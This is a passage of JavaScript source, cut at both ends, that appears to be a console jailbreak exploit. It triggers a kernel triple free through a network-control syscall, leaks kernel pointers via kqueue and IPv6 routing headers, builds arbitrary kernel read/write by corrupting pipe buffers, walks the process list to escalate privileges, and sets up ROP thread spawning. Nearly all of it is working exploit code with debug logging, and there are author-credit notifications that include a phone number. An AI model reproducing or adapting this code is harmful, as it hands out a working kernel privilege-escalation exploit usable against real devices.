    var master_sd = ipv6_socks[master];
    if (!master_sd || master_sd.eq(BigInt_Error) || master_sd.eq(new BigInt(0))) {
      return -1;
    }
    get_rthdr(ipv6_socks[master], leak_rthdr, 8);
    val = read32(leak_add);
    j = val & 0xFFFF;
    if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
      return j;
    }
    count++;
  }
  return -1;
}
function safe_memory_available() {
  try {
    if (debugging && debugging.info && debugging.info.memory) {
      return debugging.info.memory.available;
    }
  } catch (e) {
    // ignore
  }
  return 1;
}
/* ===========================
 *   yield_to_render
 * ===========================
 */
function retry(label, attempts, fn) {
  for (var i = 0; i < attempts; i++) {
    var ok = fn();
    if (ok) {
      if (i > 0) log(label + ' succeeded after retry #' + i);
      return true;
    }
    log(label + ' attempt ' + (i + 1) + ' failed');
  }
  log(label + ' all attempts failed');
  return false;
}
function yield_to_render(callback) {
  var id = jsmaf.setInterval(function () {
    jsmaf.clearInterval(id);
    try {
      callback();
    } catch (e) {
      log('ERROR: ' + e.message);
      cleanup();
    }
  }, 0);
}

/* ===========================
 *   Final Exploit Flow
 * ===========================
 */

var exploit_count = 0;
var exploit_end = false;
function netctrl_exploit() {
  setup_log_screen();
  var supported_fw = init();
  if (!supported_fw) {
    return;
  }
  log('Setting up exploit...');
  log('[FLOW] Requesting transition to: exploit_phase_setup');
  yield_to_render(exploit_phase_setup);
}
function exploit_phase_setup() {
  log('[FLOW] inside exploit_phase_setup');
  setup();
  log('Workers spawned');
  exploit_count = 0;
  exploit_end = false;
  log('[FLOW] EXIT exploit_phase_setup');
  log('[FLOW] Requesting transition to: exploit_phase_trigger');
  yield_to_render(exploit_phase_trigger);
}
function exploit_phase_trigger() {
  log('[FLOW] inside exploit_phase_trigger');
  if (exploit_count >= MAIN_LOOP_ITERATIONS) {
    log('Failed to acquire kernel R/W');
    cleanup();
    return; // ← نهاية طبيعية
  }
  exploit_count++;
  log("[TRIGGER] Triggering vulnerability (".concat(exploit_count, "/").concat(MAIN_LOOP_ITERATIONS, ")"));
  var ok = trigger_ucred_triplefree();
  if (!ok) {
    log('[TRIGGER] Triple free failed, retrying...');
    log('[FLOW] Early exit from phase');
    log('[FLOW] Requesting transition to: exploit_phase_trigger');
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('[TRIGGER] Triple free succeeded, moving to leak phase...');
  log('[FLOW] EXIT exploit_phase_trigger');
  log('[FLOW] Requesting transition to: exploit_phase_leak');
  yield_to_render(exploit_phase_leak);
}
function exploit_phase_leak() {
  log('[DEBUG] ENTER exploit_phase_leak TOP');
  log('[FLOW] inside exploit_phase_leak');
  if (!leak_kqueue()) {
    log('[LEAK] leak_kqueue failed, retrying trigger...');
    log('[FLOW] Early exit from phase');
    log('[FLOW] Requesting transition to: exploit_phase_trigger');
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('Setting up arbitrary R/W...');
  log('[FLOW] EXIT exploit_phase_leak');
  log('[FLOW] Requesting transition to: exploit_phase_rw');
  yield_to_render(exploit_phase_rw);
}
function exploit_phase_rw() {
  log('[FLOW] inside exploit_phase_rw');
  log('[RW] exploit_phase_rw: enter');
  var ok = retry('setup_arbitrary_rw', 3, () => setup_arbitrary_rw());
  if (!ok) {
    log('[RW] setup_arbitrary_rw failed after retries, restarting trigger phase');
    log('[FLOW] Early exit from phase');
    log('[FLOW] Requesting transition to: exploit_phase_trigger');
    yield_to_render(exploit_phase_trigger);
    return;
  }
  log('[FLOW] EXIT exploit_phase_rw');
  log('[FLOW] Requesting transition to: exploit_phase_jailbreak');
  yield_to_render(exploit_phase_jailbreak);
}
function exploit_phase_jailbreak() {
  log('[FLOW] inside exploit_phase_jailbreak');
  jailbreak();
  log('[FLOW] EXIT exploit_phase_jailbreak');
  log('[FLOW] Requesting transition to: exploit_phase_finish');
  yield_to_render(exploit_phase_finish);
}
function exploit_phase_finish() {
  if (exploit_end) {
    log('[FLOW] Early exit from phase');
    return;
  }
  exploit_end = true;
  log('Exploit completed successfully');
  cleanup();
}
/* ===========================
  *   Arbitrary Kernel R/W Setup
  * ===========================
  */
function setup_arbitrary_rw() {
  // Leak fd_files from kq_fdp.
  var fd_files = kreadslow64_safe(kq_fdp);
  fdt_ofiles = fd_files.add(0x00);
  debug('fdt_ofiles: ' + hex(fdt_ofiles));
  master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
  debug('master_r_pipe_file: ' + hex(master_r_pipe_file));
  victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
  debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file));
  master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
  debug('master_r_pipe_data: ' + hex(master_r_pipe_data));
  victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
  debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data));

  // Corrupt pipebuf of masterRpipeFd.
  write32(master_pipe_buf.add(0x00), 0); // cnt
  write32(master_pipe_buf.add(0x04), 0); // in
  write32(master_pipe_buf.add(0x08), 0); // out
  write32(master_pipe_buf.add(0x0C), PAGE_SIZE); // size
  write64(master_pipe_buf.add(0x10), victim_r_pipe_data); // buffer

  var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
  if (ret_write.eq(BigInt_Error)) {
    cleanup();
    throw new Error('Netctrl failed - Reboot and try again');
  }

  // Increase reference counts for the pipes.
  fhold(fget(master_pipe[0]));
  fhold(fget(master_pipe[1]));
  fhold(fget(victim_pipe[0]));
  fhold(fget(victim_pipe[1]));

  // Remove rthdr pointers from triplets
  remove_rthr_from_socket(ipv6_socks[triplets[0]]);
  remove_rthr_from_socket(ipv6_socks[triplets[1]]);
  remove_rthr_from_socket(ipv6_socks[triplets[2]]);

  // Remove triple freed file from free list
  remove_uaf_file();
  for (var i = 0; i < 0x20; i = i + 8) {
    var readed = kread64(master_r_pipe_data.add(i));
    debug('Reading master_r_pipe_data[' + i + '] : ' + hex(readed));
  }
  log('Arbitrary R/W achieved');
  debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)));
}

/* ===========================
  *   Jailbreak
  * ===========================
  */

function find_allproc() {
  // Use existing master_pipe instead of creating new one
  var pipe_0 = master_pipe[0];
  var pipe_1 = master_pipe[1];
  debug('find_allproc - Using master_pipe fds: ' + pipe_0 + ', ' + pipe_1);
  debug('find_allproc - Getting pid...');
  var pid = Number(getpid());
  debug('find_allproc - pid: ' + pid);
  debug('find_allproc - Writing pid to sockopt_val_buf...');
  write32(sockopt_val_buf, pid);
  debug('find_allproc - Calling ioctl FIOSETOWN...');
  var ioctl_ret = ioctl(new BigInt(pipe_0), FIOSETOWN, sockopt_val_buf);
  debug('find_allproc - ioctl returned: ' + ioctl_ret);
  debug('find_allproc - Getting fp...');
  var fp = fget(pipe_0);
  debug('find_allproc - fp: ' + hex(fp));
  debug('find_allproc - Reading f_data...');
  var f_data = kread64(fp.add(0x00));
  debug('find_allproc - f_data: ' + hex(f_data));
  debug('find_allproc - Reading pipe_sigio...');
  var pipe_sigio = kread64(f_data.add(0xd0));
  debug('find_allproc - pipe_sigio: ' + hex(pipe_sigio));
  debug('find_allproc - Reading p...');
  var p = kread64(pipe_sigio);
  debug('find_allproc - initial p: ' + hex(p));
  kernel.addr.curproc = p; // Set global curproc

  debug('find_allproc - Walking process list...');
  var walk_count = 0;
  while (!p.and(new BigInt(0xFFFFFFFF, 0x00000000)).eq(new BigInt(0xFFFFFFFF, 0x00000000))) {
    p = kread64(p.add(0x08)); // p_list.le_prev
    walk_count++;
    if (walk_count % 100 === 0) {
      debug('find_allproc - walk_count: ' + walk_count + ' p: ' + hex(p));
    }
  }
  debug('find_allproc - Found allproc after ' + walk_count + ' iterations');

  // Don't close - using master_pipe which we need

  return p;
}
function jailbreak() {
  if (!kernel_offset) throw new Error('Kernel offsets not loaded');
  if (FW_VERSION === null) throw new Error('FW_VERSION is null');
  for (var i = 0; i < 10; i++) sched_yield();
  kernel.addr.allproc = find_allproc();
  var ko = kernel_offset;
  kernel.addr.base = kl_lock.sub(ko.KL_LOCK);
  log('Kernel base: ' + hex(kernel.addr.base));
  jailbreak_shared(FW_VERSION);
  log('Jailbreak Complete');
  utils.notify('Jailbreak succeeded');
  utils.notify('Magic Code : By M.ELHOUT +201007557781');
  utils.notify('Thanks : enjoy');
  show_success();
  run_binloader();
}
/* ===========================
  *   kread / kwrite wrappers
  * =========================== */

function kwrite64(addr, val) {
  var buf = malloc(8);
  write64(buf, val);
  var ret = kwriteslow(addr, buf, 8);
  if (ret.eq(BigInt_Error)) {
    log('[KW] kwrite64 failed at addr: ' + hex(addr) + ' val: ' + hex(val));
    return false;
  }
  return true;
}
function kwrite32(addr, val) {
  var buf = malloc(4);
  write32(buf, val);
  var ret = kwriteslow(addr, buf, 4);
  if (ret.eq(BigInt_Error)) {
    log('[KW] kwrite32 failed at addr: ' + hex(addr) + ' val: ' + val);
    return false;
  }
  return true;
}
function kread64(addr) {
  return kreadslow64_safe(addr);
}
function kread32(addr) {
  var buf = kreadslow(addr, 4);
  if (buf.eq(BigInt_Error)) {
    log('[KR] kread32 failed at addr: ' + hex(addr));
    // نرجّع قيمة مميزة (مثلاً 0) ونسيب اللي فوق يقرّر
    return 0;
  }
  return read32(buf);
}
function read_buffer(addr, len) {
  var buffer = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
    buffer[i] = Number(read8(addr.add(i)));
  }
  return buffer;
}
function write_buffer(addr, buffer) {
  for (var i = 0; i < buffer.length; i++) {
    write8(addr.add(i), buffer[i]);
  }
}

// Functions used in global kernel.js
// buf is Uint8Array()
kernel.read_buffer = function (kaddr, len) {
  kread(tmp, kaddr, len);
  return read_buffer(tmp, len);
};
kernel.write_buffer = function (kaddr, buf) {
  write_buffer(tmp, buf);
  kwrite(kaddr, tmp, buf.length);
};
/* ===========================
  *   Kernel R/W Primitives
  * ===========================
  */

function fhold(fp) {
  var old = kread32(fp.add(0x28));
  var ok = kwrite32(fp.add(0x28), old + 1);
  if (!ok) {
    log('[FHOLD] kwrite32 failed for fp: ' + hex(fp));
  }
}
function fget(fd) {
  var f = kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
  return f;
}
function remove_rthr_from_socket(fd) {
  // In case last triplet was not found in kwriteslow
  // At this point we don't care about twins/triplets
  if (Number(fd) > 0) {
    var fp = fget(fd);
    var f_data = kread64(fp.add(0x00));
    var so_pcb = kread64(f_data.add(0x18));
    var in6p_outputopts = kread64(so_pcb.add(0x118));
    kwrite64(in6p_outputopts.add(0x68), new BigInt(0)); // ip6po_rhi_rthdr
  }
}
var victim_pipe_buf = malloc(PIPEBUF_SIZE);
function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
  if (buffer.eq(new BigInt(0, 0))) {
    throw new Error('buffer cannot be zero');
  }
  write32(victim_pipe_buf.add(0x00), cnt); // cnt
  write32(victim_pipe_buf.add(0x04), _in); // in
  write32(victim_pipe_buf.add(0x08), out); // out
  write32(victim_pipe_buf.add(0x0C), size); // size
  write64(victim_pipe_buf.add(0x10), buffer); // buffer
  write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);

  // Debug
  /*
    read(masterRpipeFd, debug_buffer, PIPEBUF_SIZE);
    for (const i=0; i<PIPEBUF_SIZE; i=i+8) {
        const readed = read64(victim_pipe_buf.add(i));
        debug("corrupt_read: " + hex(readed) );
    }
        */

  return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
}
function kwrite(dest, src, n) {
  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
  return write(new BigInt(victimWpipeFd), src, n);
}
function kread(dest, src, n) {
  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
  read(new BigInt(victimRpipeFd), dest, n);
  return dest; // ← إضافة آمنة
}
function remove_uaf_file() {
  if (typeof uaf_socket === 'undefined') {
    throw new Error('uaf_socket is undefined');
  }
  var uafFile = fget(uaf_socket);
  var ok = kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
  if (!ok) {
    log('[RM_UAF] kwrite64 failed for main uaf_socket');
  }
  var removed = 0;
  for (var i = 0; i < 0x1000; i++) {
    var s = Number(socket(AF_UNIX, SOCK_STREAM, 0));
    if (fget(s).eq(uafFile)) {
      ok = kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
      if (!ok) {
        log('[RM_UAF] kwrite64 failed while clearing cloned socket fd=' + s);
      }
      removed++;
    }
    close(new BigInt(s));
    if (removed === 3) break;
  }
}

/* ===========================
  *   Triplet Finder
  * ===========================
  */

function trigger_ucred_triplefree() {
  var end = false;
  write64(msgIov.add(0x0), new BigInt(1));
  write64(msgIov.add(0x8), new BigInt(1));
  var main_count = 0;
  while (!end && main_count < TRIPLEFREE_ITERATIONS) {
    main_count++;
    var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    // Register dummy socket
    write32(nc_set_buf, Number(dummy_socket) & 0xFFFFFFFF);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
    close(new BigInt(dummy_socket));

    // Allocate new ucred
    setuid(1);

    // Reclaim FD
    uaf_socket = Number(socket(AF_UNIX, SOCK_STREAM, 0));

    // Free previous ucred
    setuid(1);

    // Unregister dummy socket
    write32(nc_clear_buf, uaf_socket);
    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);

    // Reclaim with iov
    for (var i = 0; i < 32; i++) {
      trigger_iov_recvmsg();
      sched_yield();
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
    }

    // Double free ucred
    close(dup(new BigInt(uaf_socket)));

    // Find twins
    end = find_twins();
    if (!end) {
      if (cleanup_called) throw new Error('Netctrl failed - Reboot and try again');
      close(new BigInt(uaf_socket));
      continue;
    }
    log('[TRIPLE] Twins found, starting triple free');
    var sd = ipv6_socks[twins[1]];
    if (!sd || sd.eq(BigInt_Error) || sd.eq(new BigInt(0))) {
      log('[TRIPLE] invalid socket in twins[1]');
      return false;
    }
    // Free one
    free_rthdr(ipv6_socks[twins[1]]);
    var count = 0;
    while (count < 6000) {
      trigger_iov_recvmsg();
      sched_yield();
      get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
      if (read32(leak_rthdr) === 1) break;
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      count++;
    }
    if (count === 6000) {
      log('[TRIPLE] Dropped out from reclaim loop');
      close(new BigInt(uaf_socket));
      continue;
    }
    triplets[0] = twins[0];

    // Triple free
    close(dup(new BigInt(uaf_socket)));

    // Find triplet 1
    triplets[1] = find_triplet(triplets[0], -1);
    if (triplets[1] === -1) {
      log("[TRIPLE] Couldn't find triplet 1");
      write(new BigInt(iov_sock_1), tmp, 1);
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }
    write(new BigInt(iov_sock_1), tmp, 1);

    // Find triplet 2
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] === -1) {
      log("[TRIPLE] Couldn't find triplet 2");
      close(new BigInt(uaf_socket));
      end = false;
      continue;
    }
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }
  if (main_count === TRIPLEFREE_ITERATIONS) {
    log('[TRIPLE] Failed to triple free after max iterations');
    return false;
  }
  log('[TRIPLE] Triple free succeeded, leaking kqueue next');
  return true;
}

/* ===========================
  *   Leak kqueue
  * ===========================
  */
function leak_kqueue() {
  log('[LEAK] Enter leak_kqueue');
  log('[LEAK] Starting kqueue leak phase');

  // تأمين triplets[1] قبل free_rthdr
  var sd1 = ipv6_socks[triplets[1]];
  var sd0 = ipv6_socks[triplets[0]];
  if (!sd1 || sd1.eq(BigInt_Error) || sd1.eq(new BigInt(0)) || !sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
    log('[LEAK] Invalid triplet sockets in leak_kqueue, aborting leak');
    return false;
  }

  // Free one.
  free_rthdr(sd1);

  // Leak kqueue.
  var kq = new BigInt(0);

  // Minimizing footprint
  var magic_val = new BigInt(0x0, 0x1430000);
  var magic_add = leak_rthdr.add(0x08);
  var count = 0;
  while (count < KQUEUE_ITERATIONS) {
    if (count % 1000 === 0) {
      log('[LEAK] Progress iteration=' + count);
    }
    kq = kqueue();

    // إعادة التحقق من sd0 بدون إعادة تعريفه
    sd0 = ipv6_socks[triplets[0]];
    if (!sd0 || sd0.eq(BigInt_Error) || sd0.eq(new BigInt(0))) {
      log('[LEAK] triplets[0] socket became invalid during loop');
      return false;
    }
    get_rthdr(sd0, leak_rthdr, 0x100);
    var cur_magic = read64(magic_add);
    var cur_fdp = read64(leak_rthdr.add(0x98));

    if (count % 1000 === 0) {
      debug('[LEAK] iter=' + count + ' magic=' + hex(cur_magic) + ' fdp=' + hex(cur_fdp));
    }
    if (cur_magic.eq(magic_val) && !cur_fdp.eq(0)) {
      log('[LEAK] Pattern matched, breaking loop');
      break;
    }
    if (kq && !kq.eq(BigInt_Error)) {
      close(kq);
    }
    sched_yield();
    count++;
  }
  if (count === KQUEUE_ITERATIONS) {
    log('[LEAK] Failed to leak kqueue_fdp after ' + count + ' iterations');
    if (kq && !kq.eq(BigInt_Error)) {
      close(kq);
    }
    return false;
  }
  kl_lock = read64(leak_rthdr.add(0x60));
  kq_fdp = read64(leak_rthdr.add(0x98));
  if (kq_fdp.eq(0)) {
    log('[LEAK] Failed to leak kqueue_fdp (kq_fdp == 0)');
    return false;
  }
  log('[LEAK] kq_fdp=' + hex(kq_fdp) + ' kl_lock=' + hex(kl_lock));

  // Close kqueue to free buffer.
  if (kq && !kq.eq(BigInt_Error)) {
    close(kq);
  }

  // Find new triplets[1]
  triplets[1] = find_triplet(triplets[0], triplets[2]);
  return true;
}

/* ===========================
  *   uio/KR/KW
  * ===========================
  */

function kreadslow64(address) {
  var buffer = kreadslow(address, 8);
  if (buffer.eq(BigInt_Error)) {
    log('[KR64] ERROR: kreadslow64 failed at addr: ' + hex(address));
    // خليه بس يرجّع BigInt_Error، والفلو الأعلى يستخدم kreadslow64_safe لو عايز behavior أصعب
    return BigInt_Error;
  }
  return read64(buffer);
}
function kreadslow64_safe(address) {
  var buffer = kreadslow(address, 8);
  if (buffer.eq(BigInt_Error)) {
    log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address));
    cleanup();
    throw new Error('Netctrl failed - Reboot and try again');
  }
  return read64(buffer);
}
function build_uio(uio, uio_td, read, addr, size) {
  const iov_addr = uio.add(0x30);

  // struct uio
  write64(uio.add(0x00), iov_addr);        // uio_iov = &uio[0x30]
  write64(uio.add(0x08), UIO_IOV_NUM);     // uio_iovcnt
  write64(uio.add(0x10), BigInt_Error);    // uio_offset
  write64(uio.add(0x18), size);            // uio_resid
  write32(uio.add(0x20), UIO_SYSSPACE);    // uio_segflg
  write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_rw
  write64(uio.add(0x28), uio_td);          // uio_td

  // أول iovec
  write64(iov_addr.add(0x00), addr);       // iov_base
  write64(iov_addr.add(0x08), size);       // iov_len
}
function kreadslow(addr, size) {
  debug('Enter kreadslow addr: ' + hex(addr) + ' size : ' + size);

  if (!addr || size <= 0) {
    log('[KR] Invalid addr/size');
    return BigInt_Error;
  }
  if (!uio_sock_0 || !uio_sock_1) {
    log('[KR] Invalid uio sockets');
    return BigInt_Error;
  }

  // Memory exhaustion check (soft)
  if (debugging.info.memory.available === 0) {
    log('kreadslow - Memory exhausted before start (soft)');
  }

  // Prepare leak buffers.
  var leak_buffers = new Array(UIO_THREAD_NUM);
  for (var i = 0; i < UIO_THREAD_NUM; i++) {
    leak_buffers[i] = malloc(size);
  }

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Fill queue.
  write(new BigInt(uio_sock_1), tmp, size);

  // Set iov length
  write64(uioIovRead.add(0x08), size);

  // Stage1: reclaim uio
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_add = leak_rthdr.add(0x08);
  var count = 0;
  var zeroMemoryCount = 0;

  while (count < 6000) {
    // في kreadslow
    if (safe_memory_available() === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 8) {
        log('kreadslow - memory.available == 0 in stage1 (soft)');
      }
    } else {
      zeroMemoryCount = 0;
    }
    count++;
    if (count % 1000 === 0) {
      log('[KR] Stage1 progress=' + count);
    }

    trigger_uio_writev();
    sched_yield();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }

    // Wake + drain
    read(new BigInt(uio_sock_0), tmp, size);
    for (var j = 0; j < UIO_THREAD_NUM; j++) {
      read(new BigInt(uio_sock_0), leak_buffers[j], size);
    }
    wait_uio_writev();
    write(new BigInt(uio_sock_1), tmp, size);
  }

  if (count === 6000) {
    debug('kreadslow - Failed uio reclaim after 6000 iterations');
    return BigInt_Error;
  }

  // بعد ما تجيب uio_iov من leak_rthdr مش محتاجه هنا
  // var uio_iov = read64(leak_rthdr);

  // استخدم uio_buf self-contained
  build_uio(uio_buf, 0, true, addr, size);
  // Stage2: تثبيت uio_segflg = UIO_SYSSPACE
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_add = leak_rthdr.add(0x20);
  var count2 = 0;
  var zeroMemoryCount2 = 0;
  while (true) {
    count2++;
    if (count2 > 10000) {
      log('[KR] Stage2 failed after max iterations');
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      return BigInt_Error;
    }
    if (safe_memory_available() === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 8) {
        log('[KR] Warning: memory.available == 0 in stage2 (soft fail), continuing...');
      }
    } else {
      zeroMemoryCount2 = 0;
    }
    trigger_iov_recvmsg();
    sched_yield();
    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break;
    }
    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  // قراءة الداتا من الكيرنل إلى أحد الـ leak_buffers
  read(new BigInt(uio_sock_0), tmp, size);
  var leak_buffer = new BigInt(0);
  var tag_val = new BigInt(0x41414141, 0x41414141);
  for (let j = 0; j < UIO_THREAD_NUM; j++) {
    read(new BigInt(uio_sock_0), leak_buffers[j], size);
    var val = read64(leak_buffers[j]);
    if (!val.eq(tag_val)) {
      triplets[1] = find_triplet(triplets[0], -1);
      leak_buffer = leak_buffers[j];
    }
  }

  // Workers should have finished earlier no need to wait
  wait_uio_writev();

  // Release iov spray.
  write(new BigInt(iov_sock_1), tmp, 1);

  if (leak_buffer.eq(new BigInt(0))) {
    log('[KR] No valid leak_buffer found (all buffers matched tag)');
    // زي الأصلي: نضمن iov loop اتقفل
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  // Find triplets[2]
  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    sched_yield();
  }
  if (triplets[2] === -1) {
    log('[KR] Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  return leak_buffer;
}
function kwriteslow(addr, buffer, size) {
  debug('Enter kwriteslow addr: ' + hex(addr) + ' buffer: ' + hex(buffer) + ' size : ' + size);

  if (!addr || size <= 0) {
    log('[KW] Invalid addr/size');
    return BigInt_Error;
  }
  if (!uio_sock_0 || !uio_sock_1) {
    log('[KW] Invalid uio sockets');
    return BigInt_Error;
  }

  if (debugging.info.memory.available === 0) {
    log('kwriteslow - Memory exhausted before start (soft)');
  }

  // Set send buf size.
  write32(sockopt_val_buf, size);
  setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);

  // Set iov length.
  write64(uioIovWrite.add(0x08), size);

  // Stage1: reclaim uio
  free_rthdr(ipv6_socks[triplets[1]]);
  var uio_leak_add = leak_rthdr.add(0x08);
  var zeroMemoryCount = 0;
  var count = 0;

  while (true) {
    // في kreadslow
    if (safe_memory_available() === 0) {
      zeroMemoryCount++;
      if (zeroMemoryCount >= 8) {
        log('kwriteslow - memory.available == 0 in stage1 (soft)');
      }
    } else {
      zeroMemoryCount = 0;
    }

    if (count % 1000 === 0) {
      log('[KW] Stage1 progress=' + count);
    }
    count++;
    if (count > 10000) {
      log('[KW] Stage1 failed after max iterations');
      return BigInt_Error;
    }

    trigger_uio_readv();
    sched_yield();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
    if (read32(uio_leak_add) === UIO_IOV_NUM) {
      break;
    }

    for (var i = 0; i < UIO_THREAD_NUM; i++) {
      write(new BigInt(uio_sock_1), buffer, size);
    }
    wait_uio_readv();
  }

  // var uio_iov = read64(leak_rthdr);

  build_uio(uio_buf, 0, false, addr, size);

  // Stage2: reclaim iov
  free_rthdr(ipv6_socks[triplets[2]]);
  var iov_leak_add = leak_rthdr.add(0x20);
  var zeroMemoryCount2 = 0;
  var count2 = 0;

  while (true) {
    if (debugging.info.memory.available === 0) {
      zeroMemoryCount2++;
      if (zeroMemoryCount2 >= 8) {
        log('kwriteslow - memory.available == 0 in stage2 (soft)');
      }
    } else {
      zeroMemoryCount2 = 0;
    }

    if (count2 % 1000 === 0) {
      log('[KW] Stage2 progress=' + count2);
      
    }
    count2++;
    if (count2 > 10000) {
      log('[KW] Stage2 failed after max iterations');
      write(new BigInt(iov_sock_1), tmp, 1);
      wait_iov_recvmsg();
      read(new BigInt(iov_sock_0), tmp, 1);
      return BigInt_Error;
    }

    trigger_iov_recvmsg();
    sched_yield();

    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
    if (read32(iov_leak_add) === UIO_SYSSPACE) {
      break;
    }

    write(new BigInt(iov_sock_1), tmp, 1);
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
  }

  // Corrupt data.
  for (var j = 0; j < UIO_THREAD_NUM; j++) {
    write(new BigInt(uio_sock_1), buffer, size);
  }

  triplets[1] = find_triplet(triplets[0], -1);

  wait_uio_readv();
  write(new BigInt(iov_sock_1), tmp, 1);

  for (var retry = 0; retry < 3; retry++) {
    triplets[2] = find_triplet(triplets[0], triplets[1]);
    if (triplets[2] !== -1) break;
    sched_yield();
  }
  if (triplets[2] === -1) {
    log('[KW] Failed to find triplets[2]');
    wait_iov_recvmsg();
    read(new BigInt(iov_sock_0), tmp, 1);
    return BigInt_Error;
  }

  wait_iov_recvmsg();
  read(new BigInt(iov_sock_0), tmp, 1);
  return new BigInt(0);
}
/* ===========================
  *   ROP regen & thread spawn
  * ===========================
  */

function rop_regen_and_loop(last_rop_entry, number_entries) {
  var new_rop_entry = last_rop_entry.add(8);
  var copy_entry = last_rop_entry.sub(number_entries * 8).add(8);
  var rop_loop = last_rop_entry.sub(number_entries * 8).add(8);
  for (var i = 0; i < number_entries; i++) {
    var entry_add = copy_entry;
    var entry_val = read64(copy_entry);
    write64(new_rop_entry.add(0x0), gadgets.POP_RDI_RET);
    write64(new_rop_entry.add(0x8), entry_add);
    write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
    write64(new_rop_entry.add(0x18), entry_val);
    write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
    copy_entry = copy_entry.add(8);
    new_rop_entry = new_rop_entry.add(0x28);
  }
  write64(new_rop_entry.add(0x0), gadgets.POP_RSP_RET);
  write64(new_rop_entry.add(0x8), rop_loop);
}
function spawn_thread(rop_array, loop_entries, predefinedStack) {
  var rop_addr = predefinedStack !== undefined ? predefinedStack : malloc(0x600);
  for (var i = 0; i < rop_array.length; i++) {
    write64(rop_addr.add(i * 8), rop_array[i]);
  }
  if (loop_entries !== 0) {
    var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8);
    rop_regen_and_loop(last_rop_entry, loop_entries);
  }
  var jmpbuf = malloc(0x60);
  write64(jmpbuf.add(0x00), gadgets.RET);
  write64(jmpbuf.add(0x10), rop_addr);
  write32(jmpbuf.add(0x40), saved_fpu_ctrl);
  write32(jmpbuf.add(0x44), saved_mxcsr);
  var stack_size = new BigInt(0x100);
  var tls_size = new BigInt(0x40);
  var stack = malloc(Number(stack_size));
  var tls = malloc(Number(tls_size));
  write64(spawn_thr_args.add(0x00), longjmp_addr);
  write64(spawn_thr_args.add(0x08), jmpbuf);
  write64(spawn_thr_args.add(0x10), stack);
  write64(spawn_thr_args.add(0x18), stack_size);
  write64(spawn_thr_args.add(0x20), tls);
  write64(spawn_thr_args.add(0x28), tls_size);
  write64(spawn_thr_args.add(0x30), spawn_tid);
  write64(spawn_thr_args.add(0x38), spawn_cpid);
  var result = thr_new(spawn_thr_args, 0x68);
  if (!result.eq(new BigInt(0))) {
    throw new Error('thr_new failed: ' + hex(result));
  }
  return read64(spawn_tid);
}

/* ===========================
  *   ROP Worker Builders
  * ===========================
  */

function iov_recvmsg_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
  var rop = [];
  rop.push(new BigInt(0));
  var cpu_mask = malloc(0x10);
